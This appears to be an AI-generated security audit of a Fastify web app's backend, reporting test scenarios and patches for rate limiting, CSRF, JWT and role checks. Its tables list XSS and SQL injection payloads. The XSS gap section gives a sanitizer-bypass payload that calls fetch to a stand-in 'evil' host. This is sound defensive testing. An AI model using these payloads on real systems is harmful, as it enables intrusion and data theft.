# BErozgar — Abuse Simulation & Security Validation Report

> **Date:** 2026-03-10  
> **Method:** Full static code audit (server not live during analysis) + executable simulation script  
> **Simulation script:** `scripts/security-simulation.mjs` (run with `node scripts/security-simulation.mjs`)  
> **Scope:** `server/src/` — all routes, middleware, plugins, services, and error handling

---

## Executive Summary

| Category | Status |
|---|---|
| Rate limiting implementation | ✅ Implemented — **⚠ in-memory only** |
| 429 response shape | ✅ Correct code, no stack trace |
| Stack trace leakage | ✅ None found |
| XSS sanitization | ✅ Multi-pass regex; Prisma ORM prevents SQLi |
| SQL injection | ✅ Blocked by Prisma parameterization |
| CSRF enforcement | ✅ Enforced in non-dev; **⚠ skipped in `NODE_ENV=development`** |
| JWT tampering (alg:none) | ✅ `algorithms: ['HS256']` enforced |
| Role escalation | ✅ Role assigned server-side only; Zod strips unknown fields |
| Admin endpoint RBAC | ✅ Scope-level `authenticate` + `authorize('ADMIN')` on all admin routes |
| Internal error leakage | ✅ Unknown errors always masked as `INTERNAL_ERROR` |
| Idempotency attack | ✅ Atomic sentinel + P2002 race handling |
| Account enumeration | ✅ Opaque OTP response whether email exists or not |
| Refresh token exposure | ✅ httpOnly cookie only, never in body |
| Login brute-force | ✅ 5-attempt lockout (DB-persisted, 15 min) |

**Overall:** Security posture is **solid**. Three medium-severity gaps and three low-severity findings documented below.

---

## Scenario Results

### Scenario 1 — 500 Rapid Login Attempts

**Test:** Rapid `POST /api/auth/login` burst from single IP.

**Expected vs Actual:**

| Check | Expected | Code Evidence | Result |
|---|---|---|---|
| Rate limit triggers | After 5 attempts (15 min window) | `ROUTE_RATE_LIMITS['POST /api/auth/login'] = { max: 5, timeWindow: '15 minutes' }` | ✅ PASS |
| 429 body has `RATE_LIMIT_EXCEEDED` | Yes | `errorResponseBuilder` in `rate-limit.ts` | ✅ PASS |
| 429 body has no stack trace | Yes | `errorResponseBuilder` returns static object | ✅ PASS |
| `Retry-After` header present | Yes | `addHeaders` config | ✅ PASS |
| Per-email throttle | In-handler | Rate limit keys by IP/userId (body unavailable at `onRequest`) | ✅ PASS |
| Account lockout (DB) | After 5 wrong passwords | `MAX_FAILED_ATTEMPTS = 5`, `lockedUntil` set in DB | ✅ PASS |

**Gap Found — SEV MEDIUM:**

> The IP-based rate limiter and the password lockout are **two independent mechanisms** operating in sequence. An attacker with 5+ IPs can exhaust each IP's 5-attempt budget before the per-account lockout fires. With 25+ rotating IPs, the lockout never triggers. This is mitigated if rate limit storage is Redis-shared across instances and CDN-level IP throttling is applied.

**Recommendation:** See [RT-01](#rt-01---rate-limit-shared-store).

---

### Scenario 2 — 200 Rapid Listing Creation Attempts

**Test:** Burst `POST /api/listings` without authentication.

| Check | Expected | Code Evidence | Result |
|---|---|---|---|
| Returns 401 on all unauthenticated | Yes | `authenticate` preHandler on listings route | ✅ PASS |
| Per-route limit for authenticated | 10/60min | `ROUTE_RATE_LIMITS['POST /api/listings'] = { max: 10, timeWindow: '60 minutes' }` | ✅ PASS |
| No 5xx on burst | Yes | Auth check precedes any business logic | ✅ PASS |

---

### Scenario 3 — 100 Request Submissions

**Test:** Burst `POST /api/requests` without authentication.

| Check | Expected | Code Evidence | Result |
|---|---|---|---|
| Returns 401 on all unauthenticated | Yes | `authenticate` preHandler on requests route | ✅ PASS |
| Per-route limit for authenticated | 20/60min | `ROUTE_RATE_LIMITS['POST /api/requests'] = { max: 20, timeWindow: '60 minutes' }` | ✅ PASS |

---

### Scenario 4 — Replay Idempotency Attack

**Test:** Two concurrent requests with the same `X-Idempotency-Key`.

| Check | Expected | Code Evidence | Result |
|---|---|---|---|
| Only one proceeds | Yes | Atomic DB sentinel (create with `responseStatus: 102`) | ✅ PASS |
| Concurrent duplicate gets 409 | Yes | Unique constraint → `P2002` catch → 409 `IDEMPOTENCY_RACE` | ✅ PASS |
| Completed replay returns original | Yes | Subsequent same-key returns stored `responseBody` + `x-idempotency-replay: true` | ✅ PASS |
| Key > 128 chars rejected | Yes | Length check before DB lookup | ✅ PASS |
| Expired keys re-claimed | Yes | `expiresAt < now` → delete + proceed | ✅ PASS |

**Gap Found — SEV LOW:**

> Idempotency keys are scoped to `userId:key`. Unauthenticated callers skip idempotency entirely. This is correct but means unauthenticated bursts bypass the idempotency replay mechanism — they are blocked only by RBAC (401), not idempotency. **Not a vulnerability**, but worth noting in load testing.

---

### Scenario 5 — CSRF Token Missing

**Test:** `POST /api/listings` without `X-CSRF-Token` header or `_csrf` cookie.

| Check | Expected | Code Evidence | Result |
|---|---|---|---|
| Returns 403 in production/staging | Yes | `enforce = env.NODE_ENV !== 'development'` | ✅ PASS (prod) |
| Returns 401 in development | Yes (design decision) | CSRF skipped in dev → auth gate fires | ⚠ WARN (dev) |
| Timing-safe comparison | Yes | `timingSafeEqual` used | ✅ PASS |
| CSRF cookie is `SameSite=Strict` | Yes | `sameSite: 'strict'` in setCookie | ✅ PASS |

**Gap Found — SEV MEDIUM:**

> The CSRF check is **fully disabled in `NODE_ENV=development`** (`csrf.ts:L43`). Any staging deployment that ships with `NODE_ENV=development` (common with copied `.env` files) will have **no CSRF protection at all**, even over HTTPS. The exempt path list is also generous (logout is exempt: `SEC-CSRF: teardown must always succeed` — reasonable, but means a CSRF attack can force logout).

**Recommendation:** See [CS-01](#cs-01---csrf-staging-gap).

---

### Scenario 6 — XSS Payload in Input

**Test:** Malicious strings in request body fields.

| Payload | Sanitizer Pattern | Result |
|---|---|---|
| `<script>alert(1)</script>` | `/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi` | ✅ Stripped |
| `<<script>script>alert(1)<</script>/script>` | 5-pass iterative loop catches nested wrapping | ✅ Stripped (5-pass) |
| `<img onerror="…">` | `/on\w+\s*=\s*["'][^"']*["']/gi` | ✅ Stripped |
| `javascript:alert(1)` | `/javascript\s*:/gi` | ✅ Stripped |
| `<svg/onload=alert(1)>` | `/on\w+\s*=\s*["'][^"']*["']/gi` catches quoted; `sanitizeString` encodes `<svg` → `&lt;svg` | ✅ Safe |
| `data:text/html,<script>…` | `/data\s*:\s*text\/html/gi` | ✅ Stripped |
| `\u003cscript\u003e…` | Browsers decode unicode before parse; Zod trims string | ✅ Safe (Zod trims + React escapes) |

**Gap Found — SEV LOW:**

> The `on\w+\s*=\s*["'][^"']*["']` pattern matches `onclick="…"` but **does not match unquoted handlers**: `onmouseover=alert(1)`. Modern HTML parsers accept `onerror=alert(1)` without quotes. This is defense-in-depth only (Prisma ORM + React's output escaping handle the real risk), but the sanitizer regex is incomplete.

**Recommendation:** See [SAN-01](#san-01---unquoted-event-handler-regex).

---

### Scenario 7 — SQL Injection Attempt

**Test:** SQLi strings as email/password inputs.

| Payload | DB Layer | Result |
|---|---|---|
| `' OR '1'='1` | Prisma `findUnique({ where: { email: payload } })` — parameterized | ✅ PASS — never reaches DB as SQL |
| `'; DROP TABLE users; --` | Same | ✅ PASS |
| `' UNION SELECT * FROM "User" --` | Same | ✅ PASS |
| `1; SELECT pg_sleep(5)--` | Same | ✅ PASS — no timing delay possible |
| Raw SQL via `$queryRaw` in listings FSM | Tagged template literal — Prisma parameterizes `${listingId}` | ✅ PASS |

**Error leakage check:**

```
Unknown errors → serializeError → { error: 'Internal server error', code: 'INTERNAL_ERROR' }
```

Prisma errors (P2xxx) are never included in the response body. Full error object is logged server-side only.

**Result: No SQL injection risk. No DB error leakage. ✅**

---

### Scenario 8 — JWT Tampering

**Test:** Forged, tampered, expired, and alg:none tokens against `GET /api/auth/me`.

| Attack | Token Shape | Expected | Code Evidence | Result |
|---|---|---|---|---|
| `alg:none` | `{alg:"none"}.payload.` | 401 | `algorithms: ['HS256']` in `verifyAccessToken` | ✅ PASS |
| Wrong secret | Valid header + invalid sig | 401 | HMAC mismatch → `jwt.verify` throws | ✅ PASS |
| Tampered payload | Correct header, modified role, bad sig | 401 | Signature verification fails | ✅ PASS |
| Expired token | `exp` in past | 401 | `jwt.verify` throws `TokenExpiredError` | ✅ PASS |
| Empty Bearer | `Authorization: Bearer ` | 401 | `token = authHeader.slice(7)` → `''` → `verifyAccessToken` throws | ✅ PASS |
| No header at all | — | 401 | `if (!authHeader?.startsWith('Bearer ')) return` → userId undefined → authenticate throws | ✅ PASS |

**Result: JWT attack surface fully hardened. ✅**

---

### Scenario 9 — Role Escalation Attempt

**Test:** Inject `role: 'ADMIN'` in signup/login body.

| Vector | Mechanism | Result |
|---|---|---|
| `role: 'ADMIN'` in signup body | Zod `signupSchema` has no `role` field — unknown keys stripped | ✅ BLOCKED |
| `privilegeLevel: 'SUPER'` in signup body | Same — stripped by Zod | ✅ BLOCKED |
| `isAdmin: true` in body | Same — stripped by Zod | ✅ BLOCKED |
| Role in JWT payload (tampered) | HMAC signature check fails | ✅ BLOCKED |
| PATCH `/api/auth/me` with `role` | Endpoint does not exist (405/404) — or requires auth (401) | ✅ BLOCKED |

**DB-level enforcement:**

```ts
// user.upsert in verifyOtp — NO role field in create/update
const createdUser = await tx.user.upsert({
  where: { email: input.email },
  create: {
    email: input.email,
    fullName: input.fullName,
    password: passwordHash,
    verified: true,
    // role NOT here — default 'STUDENT' from DB schema
  },
  ...
```

Role defaults to `STUDENT` in the database schema. No user-controlled field path leads to `ADMIN`.

**Result: Role escalation impossible. ✅**

---

### Scenario 10 — Admin Endpoint Access as Student

**Test:** Unauthenticated and forged-JWT access to all admin routes.

| Route | Expected (unauth) | Code Evidence |
|---|---|---|
| `GET /api/admin/pending` | 401 | Scope-level `addHook('onRequest', authenticate)` |
| `GET /api/admin/stats` | 401 | Same |
| `GET /api/admin/fraud` | 401 | Same |
| `GET /api/admin/audit` | 401 | Same |
| `GET /api/admin/integrity` | 401 | Same + `requireSuperPrivilege()` inside handler |
| `GET /api/admin/users/:id` | 401 | Same |
| `POST /api/admin/recovery` | 401 | Same + `requireSuperPrivilege()` |
| `POST /api/admin/audit` | 401 | Same |

**Forged student JWT** (wrong signature): all `→ 401` because `verifyAccessToken` throws before `authorize('ADMIN')` is reached.

**Super-privilege triple check** (for `/integrity` and `/recovery`):
```ts
async function requireSuperPrivilege(userId: string): Promise<void> {
  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user
    || user.role !== 'ADMIN'              // DB role
    || user.privilegeLevel !== 'SUPER'    // DB privilege level
    || !ADMIN_REGISTRY.includes(user.email) // Hardcoded allowlist
  ) throw new ForbiddenError('Super admin privilege required');
}
```

**Result: Admin endpoint access fully blocked. ✅**

---

## Security Gaps

### 🔴 GAP-01 (MEDIUM) — Rate Limiter: In-Memory, Not Cluster-Safe {#rt-01---rate-limit-shared-store}

**File:** [`server/src/plugins/rate-limit.ts`](server/src/plugins/rate-limit.ts)  
**Impact:** In a horizontally scaled deployment (2+ instances behind a load balancer), each Fastify process maintains an independent in-memory counter. An attacker can multiply their effective request budget by the number of instances.

**Example:** With 3 instances and `max: 5` for login, an attacker can make 15 login attempts before any single instance fires a 429. The DB-level lockout (5 failed passwords) is a partial backstop but operates on correct credentials only.

**Code:**
```ts
// rate-limit.ts — no store: config, defaults to in-memory
await app.register(rateLimit, {
  max: env.RATE_LIMIT_MAX,
  timeWindow: env.RATE_LIMIT_WINDOW_MS,
  // ⚠ No Redis store — in-memory only
```

**Patch:**
```ts
import Redis from 'ioredis';

await app.register(rateLimit, {
  max: env.RATE_LIMIT_MAX,
  timeWindow: env.RATE_LIMIT_WINDOW_MS,
  redis: new Redis({ host: env.REDIS_HOST, port: env.REDIS_PORT }),
  // ... rest of config
});
```

---

### 🔴 GAP-02 (MEDIUM) — CSRF Disabled in Development, Risk in Staging {#cs-01---csrf-staging-gap}

**File:** [`server/src/plugins/csrf.ts:43`](server/src/plugins/csrf.ts)  
**Impact:** Any server started with `NODE_ENV=development` has **zero CSRF enforcement**, regardless of whether it's serving production users.

**Code:**
```ts
// Entire validation hook absent when NODE_ENV === 'development'
const enforce = env.NODE_ENV !== 'development';
if (enforce) {
  app.addHook('onRequest', async (request, reply) => {
    // ... CSRF check
  });
}
```

**Patch:** Add an explicit `CSRF_ENFORCE` env var rather than tying to `NODE_ENV`. Default to `true` in `.env.production` and `.env.staging`:
```ts
// config/env.ts
CSRF_ENFORCE: z.enum(['true','false']).transform(v => v === 'true').default('true'),
```
```ts
// plugins/csrf.ts
const enforce = env.CSRF_ENFORCE;
```

---

### 🔴 GAP-03 (MEDIUM) — Dead Admin Status Transitions (Zod Schema Mismatch) {#schema-01}

**File:** [`server/src/shared/validation.ts`](server/src/shared/validation.ts)  
**Impact:** Admins cannot `flag`, `remove`, `archive`, or `expire` listings via the API. The Zod schema only allows `['approved', 'rejected', 'pending_review']` but the service FSM handles more transitions. Dead code in the service; admin workflow broken.

**Current:**
```ts
export const updateListingStatusSchema = z.object({
  status: z.enum(['approved', 'rejected', 'pending_review']),
  // ⛔ flagged, removed, archived, expired missing
```

**Patch:**
```ts
export const updateListingStatusSchema = z.object({
  status: z.enum([
    'approved', 'rejected', 'pending_review',
    'flagged', 'removed', 'archived', 'expired',  // admin-only — service enforces RBAC
  ]),
  reason: z.string().max(500).optional(),
});
```

---

### 🟡 GAP-04 (LOW) — `COOKIE_SECURE` Defaults to `false` in Env Schema {#cookie-01}

**File:** [`server/src/config/env.ts:33`](server/src/config/env.ts)  
**Impact:** In any environment where `COOKIE_SECURE=true` is not explicitly set AND `NODE_ENV !== 'production'`, refresh tokens are set without the `Secure` flag. A staging or dev server reachable over HTTPS would set cookies transmittable over HTTP (potential interception).

**Current:**
```ts
COOKIE_SECURE: z.enum(['true','false']).transform(v => v === 'true').default('false'),
```
```ts
// auth.ts — cookie helper
secure: env.COOKIE_SECURE || env.NODE_ENV === 'production',
```

**Patch:** Change default to `'true'` and override explicitly in development:
```ts
// config/env.ts
COOKIE_SECURE: z.enum(['true','false']).transform(v => v === 'true').default('true'),
```
```
# .env.development
COOKIE_SECURE=false
```

---

### 🟡 GAP-05 (LOW) — Unquoted Event Handler Regex Bypass {#san-01---unquoted-event-handler-regex}

**File:** [`server/src/plugins/sanitize.ts:27`](server/src/plugins/sanitize.ts)  
**Impact:** The sanitizer pattern `/on\w+\s*=\s*["'][^"']*["']/gi` matches `onclick="evil()"` but misses `onmouseover=evil()` (unquoted). This is defense-in-depth only — Prisma ORM prevents SQLi and React escapes HTML output — but the regex gives a false sense of completeness.

**Payload that bypasses:** `<img src=x onerror=fetch('https://evil')+`

**Patch:**
```ts
/on\w+\s*=\s*(?:["'][^"']*["']|[^\s>]+)/gi,  // match unquoted handlers too
```

---

### 🟡 GAP-06 (LOW) — Entity ID Fields Accept Arbitrary Strings (Not UUID-Typed) {#val-01}

**File:** [`server/src/shared/validation.ts`](server/src/shared/validation.ts)  
**Impact:** `listingId`, `requestId`, `againstId` use `safeString(100)` instead of `z.string().uuid()`. A non-UUID string reaches Prisma which throws `P2023` (invalid UUID) — a Prisma error wrapped by the global handler into a generic 400, but with a slightly different error path than a clean validation error.

**Patch:**
```ts
// shared/validation.ts — replace all entity ID fields
listingId: z.string().uuid('listingId must be a valid UUID'),
requestId: z.string().uuid('requestId must be a valid UUID'),
```

---

### 🟡 GAP-07 (LOW) — `POST /api/auth/refresh` Has No Per-Route Rate Limit {#rt-02}

**File:** [`server/src/plugins/rate-limit.ts`](server/src/plugins/rate-limit.ts)  
**Impact:** Refresh falls back to the global 60 req/60s limit. An attacker with a stolen refresh token cookie can probe refresh 60 times per minute before limiting. A tighter per-route limit adds defense-in-depth.

**Patch (add to `ROUTE_RATE_LIMITS`):**
```ts
'POST /api/auth/refresh': { max: 10, timeWindow: '15 minutes' },
```

---

## Rate Limit Tuning Recommendations

| Route | Current | Recommended | Rationale |
|---|---|---|---|
| `POST /api/auth/login` | 5 / 15 min | **5 / 15 min (keep)** | Correct — matches account lockout threshold |
| `POST /api/auth/signup` | 3 / 15 min | **3 / 15 min (keep)** | Tight — good |
| `POST /api/auth/verify-otp` | 5 / 15 min | **5 / 15 min (keep)** | OTP brute-force guard is correct |
| `POST /api/auth/resend-otp` | 3 / 15 min | **3 / 15 min (keep)** | Matches signup — good |
| `POST /api/auth/refresh` | 60 / 60s (global) | **10 / 15 min** | Add explicit per-route override |
| `POST /api/listings` | 10 / 60 min | **10 / 60 min (keep)** | Reasonable creation budget |
| `POST /api/requests` | 20 / 60 min | **10 / 60 min** | Consider tightening: 20 requests in 60 min is aggressive |
| `GET /api/admin/*` | 30 / 60 min | **20 / 60 min** | Reduce — admin reads should not be polled this frequently |
| Global fallback | 60 / 60 s | **60 / 60 s (keep)** | Reasonable for public GET routes |
| **Store** | In-memory | **Redis** | Required for multi-instance deployments |

---

## Log Leak Issues

### LOG-01 — No Stack Trace in HTTP Responses ✅

All error paths verified in `serializeError()`:
```ts
// Unknown errors
return {
  statusCode: 500,
  body: { error: 'Internal server error', code: 'INTERNAL_ERROR' },
  // No stack, no prisma message, no internal details
};
```

### LOG-02 — Rate Limit Response Previously Leaked Internal Details ✅ (Already Fixed)

Comment in source (`SEC-LEAK-01`) shows this was actively patched:
```ts
// SEC-LEAK-01: static error response — do not echo rate limit internals
errorResponseBuilder: (_request, context) => ({
  statusCode: 429,
  error: 'Too many requests',
  code: 'RATE_LIMIT_EXCEEDED',
  message: `Rate limit exceeded. Retry after ${Math.ceil(context.ttl / 1000)}s`,
```

### LOG-03 — Audit Logs Include IP Addresses ✅ (Intentional, Contains PII)

Login audit log records `ip: meta?.ipAddress`. This is correct for security forensics but means **DB contains PII**. Ensure: (a) DB is encrypted at rest, (b) audit log access is restricted to SUPER admins only, (c) retention policy limits log age.

### LOG-04 — Authorization Failures Logged Server-Side with Role Details ✅

```ts
request.log.warn(
  { actorRole: request.userRole, requiredRoles: allowedRoles, url: request.url },
  'Authorization failed',
);
```

This log entry includes the actor's actual role and the required roles — **correct for forensics, never sent to client**. Ensure log aggregation (Sentry, CloudWatch, etc.) has access controls so only security team can read these.

---

## Patch Suggestions (Prioritized)

### Priority 1 — Do Before First Production Deploy

1. **[GAP-01]** Add Redis store to `@fastify/rate-limit` — 1 hour effort
2. **[GAP-02]** Replace `NODE_ENV !== 'development'` CSRF check with `CSRF_ENFORCE` env var — 30 min effort
3. **[GAP-03]** Extend `updateListingStatusSchema` enum to include all admin transitions — 15 min effort

### Priority 2 — Do Before Scaling Past 1 Instance

4. **[GAP-04]** Change `COOKIE_SECURE` default to `'true'`; override in `.env.development` — 10 min effort
5. **[RT-02]** Add explicit rate limit for `POST /api/auth/refresh` — 5 min effort
6. **[RT-03]** Tighten `POST /api/requests` from 20 to 10 per 60 min — 5 min effort

### Priority 3 — Defense-in-Depth

7. **[GAP-05]** Fix unquoted event handler regex in `sanitize.ts` — 15 min effort
8. **[GAP-06]** Replace entity ID `safeString(100)` with `z.string().uuid()` — 30 min effort

---

## Running the Simulation Script

```bash
# Start backend server
cd unified-experience/server
npm run dev

# In a new terminal, run simulation
cd unified-experience
node scripts/security-simulation.mjs

# Against a different host
API_URL=https://staging.example.com node scripts/security-simulation.mjs
```

The script will:
- Exit code `0` if all assertions pass
- Exit code `1` if any assertion fails
- Exit code `2` if the server is unreachable
- Print a color-coded summary with exact status codes received vs expected

---

## What Was Not Tested (Out of Scope / Requires Live Environment)

| Attack Class | Status | Reason |
|---|---|---|
| Actual 500 simultaneous connections | Simulation only | No load-testing infrastructure |
| TLS misconfiguration | Out of scope | Nginx/CDN layer handles TLS |
| Cookie theft via XSS | Verified via code | httpOnly flag prevents JS access |
| Host header injection | Not applicable | Fastify ignores Host for routing |
| Path traversal | Not applicable | No file system access in routes |
| Dependency CVEs | Use `npm audit` | Runtime environment concern |
| Database credential exposure | Out of scope | Check `.env` files, Docker secrets |

---

*Report generated by GitHub Copilot security simulation — static analysis of `unified-experience/server/src/`.*
